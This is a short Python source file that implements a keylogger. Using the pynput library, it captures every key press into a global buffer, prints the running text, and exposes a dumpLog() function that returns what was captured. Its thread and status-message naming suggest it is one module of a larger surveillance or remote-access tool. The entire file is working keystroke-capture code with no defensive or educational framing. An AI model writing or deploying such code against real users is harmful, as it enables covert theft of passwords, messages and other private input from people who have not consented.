from threading import Thread
import pynput.keyboard
from termcolor import cprint


class Color:
    def __init__(self) -> None:
        self.red = "red"
        self.green = "green"
        self.yellow = "yellow"


keylogvar = ""
keylogthread=None
keyboard_Listener = None
color = Color()


def process_Key_Press(key):
    global keylogvar
    try:
        keylogvar += str(key.char)
        print(keylogvar)
    except AttributeError:
        if key == key.space:
            keylogvar += " "
        else:
            # keylogvar += str(key)
            keylogvar += " "


def dumpLog():
    logmsg = keylogvar
    return logmsg


def keyBoardLoggerFunc():
    global keyboard_Listener
    try:
        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
        with keyboard_Listener:
            keyboard_Listener.join()
    except Exception as ex:
        cprint("[-]Something wen Wrong", color.red)
    finally:
        cprint("[-] Terminating keyLoggerThread...", color.red)
